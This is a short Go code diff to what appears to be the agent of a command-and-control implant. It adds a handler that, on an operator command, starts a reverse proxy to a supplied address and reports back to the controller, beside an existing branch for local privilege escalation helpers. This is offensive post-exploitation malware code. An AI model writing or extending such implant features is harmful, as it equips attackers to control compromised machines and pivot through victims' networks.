@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"context"
 	"encoding/base64"
 	"fmt"
 	"io/ioutil"
@@ -148,6 +149,20 @@ func processCCData(data *MsgTunData) {
 		/*
 		   !command: special commands (not sent by user)
 		*/
+		// reverse proxy
+		if cmdSlice[0] == "!"+ModREVERSEPROXY {
+			if len(cmdSlice) != 2 {
+				return
+			}
+			addr := cmdSlice[1]
+			out = "Reverse proxy for " + addr + " finished without errors"
+			ctx, cancel := context.WithCancel(context.Background())
+			if err = StartReverseProxy(addr, ctx, cancel); err != nil {
+				out = err.Error()
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
 
 		// LPE helper
 		if strings.HasPrefix(cmdSlice[0], "!lpe_") {
